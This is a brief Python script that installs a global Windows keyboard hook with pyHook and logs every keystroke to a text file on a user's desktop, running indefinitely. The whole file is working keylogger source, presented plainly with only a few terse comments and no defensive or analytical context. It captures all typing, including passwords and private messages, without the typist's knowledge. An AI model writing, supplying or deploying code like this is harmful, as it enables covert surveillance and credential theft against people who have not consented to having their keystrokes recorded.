import pyHook,pythoncom,sys,logging

file_log = 'C:\\Users\\wembl\\Desktop\\keys.txt'

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log,level=logging.DEBUG, format ='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
#Create hook manager project
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
#Set the hook
hooks_manager.HookKeyboard()
#Wait forever
pythoncom.PumpMessages()